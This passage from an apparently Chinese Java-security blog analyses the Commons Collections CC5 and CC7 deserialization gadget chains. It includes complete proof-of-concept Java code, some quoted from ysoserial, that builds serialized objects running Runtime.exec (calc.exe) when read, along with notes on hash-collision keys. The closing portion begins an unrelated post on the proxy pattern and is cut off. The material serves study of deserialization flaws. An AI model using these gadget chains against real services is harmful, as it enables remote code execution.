<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>到这里整条链就已经很清楚了。</p>
<blockquote>
<p>BadAttributeValueExpException#readObject()</p>
<p>​	TiedMapEntry#toString()</p>
<p>​		TiedMapEntry#getValue()</p>
<p>​			LazyMap#get()</p>
</blockquote>
<p>按照ysoserial的思路自己构造CC5如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(innerMap,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;val&quot;</span>,badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在调试CommonCollections5的过程中发现执行<code>if (valObj == null)</code>时就会弹出计算机。</p>
<p>但是真正的出发点应当是下面的<code>valObj.toString()</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230911220425280.png"
                      alt="image-20230911220425280"
                ></p>
<p>后面查了以下资料得知，idea在调试的过程中，会自动调用类的<code>toString()</code>方法，以便于在控制台显示。正常情况下这么做没问题，但是如果像我们上面的情况，或者<code>toString()</code>方法是经过重写后的，在调试过程中就会产生出乎意料的错误。</p>
<p>解决方法很简单：设置中勾选掉下面两个模块即可（很多文章写的只勾选最后一个就行是错误的）<img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230911220841877.png"
                      alt="image-20230911220841877"
                ></p>
<h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><p>从ysoserial中不难看出CommonsCollections7引入了<code>Hashtable</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Hashtable <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;command&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            execArgs),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">    hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">    lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CommonsCollections7调试"><a href="#CommonsCollections7调试" class="headerlink" title="CommonsCollections7调试"></a>CommonsCollections7调试</h3><p>Hashtable和HashMap有类似，具体二者的区别这里不做讨论。</p>
<p>针对CommonsCollections7进行调试我们定位到触发点在<code>Hashtable#readObject()</code>中调用的<code>Hashtable#reconstitutionPut()</code>方法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230911230123575.png"
                      alt="image-20230911230123575"
                ></p>
<p>在反序列化时，会通过循环获取两个Entry的key和value，并放到<code>Hashtable#reconstitutionPut()</code>中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">    <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>针对该方法进行调试，定位到触发点为<code>if ((e.hash == hash) &amp;&amp; e.key.equals(key))</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来捋一下该方法做了什么。目前已知<code>Hashtable</code>中存在两个Entry，分别是&lt;lazyMap1,1&gt;和&lt;lazyMap2,2&gt;</p>
<p>第一次执行<code>reconstitutionPut()</code>时，key为<code>lazyMap1</code>，value为1</p>
<ul>
<li><code>int hash = key.hashCode()</code>：获取<code>lazyMap1</code>的hash值</li>
<li><code>int index = (hash &amp; 0x7FFFFFFF) % tab.length</code>：根据hash值确定<code>lazyMap1</code>在数组中的位置（补充：Hashtable本质上时数组）</li>
<li>进入for循环，<code>e = tab[index]</code>。此时e为空，因此并不会真正的进入for循环</li>
<li><code> tab[index] = new Entry&lt;&gt;(hash, key, value, e)</code>：将<code>lazyMap1</code>放入数组中</li>
</ul>
<p>第二次执行<code>reconstitutionPut()</code>时,key为<code>lazyMap2</code>，value为2</p>
<ul>
<li>前面的步骤相同。hash值和index也与第一次获取的相同。</li>
<li>进入for循环，<code>e = tab[index]</code>。此时e为前面存储的<code>lazyMap1</code>不为空，进入循环。（补充：这里的e是Hashtable类）</li>
<li>执行<code>e.key.equals(key)</code>：<code>e.key</code>即<code>lazyMap1</code>。这里是将<code>lazyMap1</code>和<code>lazyMap2</code>进行比较。</li>
</ul>
<p>由于<code>LazyMap</code>类本身没有<code>equals</code>，所以此处调用的为<code>AbstractMapDecorator#equals()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> object == <span class="built_in">this</span> ? <span class="literal">true</span> : <span class="built_in">this</span>.map.equals(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点在这一句代码：<code>return object == this ? true : this.map.equals(object)</code>。此时<code>this</code>为<code>lazyMap1</code>，<code>object</code>为<code>lazyMap2</code>，很明显两者不相等。因此会执行<code>this.map.equals(object)</code>，这里要注意<code>this.map</code>即<code>lazyMap1.map</code>，对应的是<code>innerMap1</code>。</p>
<p><code>innerMap1</code>为<code>HashMap</code>类，<code>HashMap</code>本身并没有<code>equals()</code>方法，所以此处调用的为<code>AbstractMap#equals()</code>，传入的参数o为<code>lazyMap2</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中执行了<code>if (!value.equals(m.get(key)))</code>，这里的m即<code>lazyMap2</code>。很明显就是这里执行了<code>LazyMap#get()</code>，并以此来执行任意命令。</p>
<p>到这里差不多就捋清了CommonsCollections7的调用链</p>
<blockquote>
<p>Hashtable#readObject()</p>
<p>​	Hashtable#reconstitutionPut()</p>
<p>​		AbstractMapDecorator#equals()</p>
<p>​			AbstractMap#equals()</p>
<p>​				LazyMap#get()</p>
</blockquote>
<p>自己构造poc如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建文件存储序列化数据</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./a.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file.createNewFile();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建输出流和输入流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="comment">//构造CC链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;iTransformers&quot;</span>,chainedTransformer,transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object o=objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><p>在构造LazyMap后存储的Entry：<code>&lt;&quot;yy&quot;,1&gt;</code>、<code>&lt;&quot;zZ&quot;,1&gt;</code>不是固定的，但一定要保证hash值相同</p>
<p>回头看一下<code>reconstitutionPut</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key))</span><br></pre></td></tr></table></figure>

<p>当<code>e.hash == hash</code>才会进一步执行<code>equals()</code>方法。这里如果进行调试会发现最后是对innerMap1和innerMap2的键值对：<code>&lt;&quot;yy&quot;,1&gt;</code>和<code>&lt;&quot;zZ&quot;,1&gt;</code>的hash值进行比较。（两个键值对的hash值均为3873）</p>
<p>查看“yy”和“zZ”的hash值发现均为3872。（上面是3873是因为还有value的hash值）</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230912172641656.png"
                      alt="image-20230912172641656"
                ></p>
<p>跟踪调试一下<code>hashCode()</code>方法，发现Java针对字符串获取hash值的逻辑为：</p>
<ol>
<li>将字符串拆分为数组</li>
<li>获取每个字符的ASCII码</li>
<li>初始hash值为0</li>
<li>将hash值乘31之后加上字符ASCII</li>
<li>读取下一个字符ASCII，并重复第4步直到结束</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比如上面的“yy”，hash值为121*31+121&#x3D;3872。”zZ”的hash值为122*31+90&#x3D;3872。掌握这个规律我们可以构造其他键值对，比如：<code>&lt;&quot;xx&quot;,1&gt;</code>和<code>&lt;&quot;z:&quot;,1&gt;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230912173014896.png"
                      alt="image-20230912173014896"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CommonsCollections5:</p>
<blockquote>
<p>BadAttributeValueExpException#readObject()</p>
<p>​	TiedMapEntry#toString()</p>
<p>​		TiedMapEntry#getValue()</p>
<p>​			LazyMap#get()</p>
</blockquote>
<p>CommonsCpllections7:</p>
<blockquote>
<p>Hashtable#readObject()</p>
<p>​	Hashtable#reconstitutionPut()</p>
<p>​		AbstractMapDecorator#equals()</p>
<p>​			AbstractMap#equals()</p>
<p>​				LazyMap#get()</p>
</blockquote>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java代理模式</title>
    <url>/2023/07/12/Java%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>代理模式是Java常见的设计模式之一。通常情况下，我们通过<code>new</code>来获取一个对象的类实例，然后通过调用其方法来获取相应的服务。而在代理模式中，是通过创建代理类（proxy）的方式来调用服务。</p>
<p>代理类会有一个委托类对象。代理类不会自己实现服务，而是通过委托类对象的方法来提供服务。所以，我们调用的仍然是委托类的方法，不过中间隔了proxy类来对委托类的方法进行更改。<strong>这么做的好处是我们可以在不改变委托类的前提下，对服务进行更新</strong>。</p>
<h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>静态代理简单来说，就是提前在代码中写好<code>proxy</code>类。在编译后无法进行更改。</p>
<p>举例说明静态代理：</p>
